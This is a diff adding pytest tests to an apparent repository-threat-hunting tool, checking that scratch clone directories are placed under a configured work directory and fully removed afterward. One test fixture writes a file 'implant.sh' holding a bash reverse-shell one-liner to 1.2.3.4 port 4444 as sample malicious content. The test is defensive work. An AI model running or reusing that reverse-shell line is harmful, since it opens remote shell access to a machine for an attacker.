@@ -107,3 +107,61 @@ def test_hunt_without_tier2_leaves_candidates_screened(tmp_path):
     assert summary["counts"]["screened"] == 1
     assert not db.findings_by_status("confirmed")
     db.close()
+
+
+def test_hunt_uses_work_dir_and_cleans_up(tmp_path, monkeypatch):
+    # GW_WORK_DIR honored, and scratch fully removed even with read-only files.
+    import os
+    import stat
+
+    import git_warden.config as cfg
+    workroot = tmp_path / "scratch"
+    workroot.mkdir()
+    monkeypatch.setattr(cfg, "WORK_DIR", workroot)
+
+    seen = {}
+
+    def ro_clone(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        seen["workdir"] = dest.parent
+        (dest / "implant.sh").write_text(
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8"
+        )
+        gitdir = dest / ".git"
+        gitdir.mkdir()
+        pack = gitdir / "pack-x.idx"
+        pack.write_text("x", encoding="utf-8")
+        os.chmod(pack, stat.S_IREAD)  # git leaves read-only pack files behind
+        return dest
+
+    db = Database.open(tmp_path / "wd.sqlite")
+    hunt(db, FakeClient(), TOOLS, run_id="hunt-wd", now=utcnow(),
+         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=ro_clone)
+    db.close()
+
+    assert seen["workdir"].parent == workroot       # scratch landed under WORK_DIR
+    assert list(workroot.iterdir()) == []           # fully cleaned -- no husks
+
+
+def test_hunt_work_dir_falls_back_to_system_temp(tmp_path, monkeypatch):
+    import tempfile
+    from pathlib import Path
+
+    import git_warden.config as cfg
+    monkeypatch.setattr(cfg, "WORK_DIR", None)
+
+    seen = {}
+
+    def clone_ok(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        seen["workdir"] = dest.parent
+        (dest / "x.sh").write_text("echo hi\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "wd2.sqlite")
+    hunt(db, FakeClient(), TOOLS, run_id="hunt-wd2", now=utcnow(),
+         do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=clone_ok)
+    db.close()
+
+    assert seen["workdir"].resolve().parent == Path(tempfile.gettempdir()).resolve()
+    assert not seen["workdir"].exists()  # cleaned up
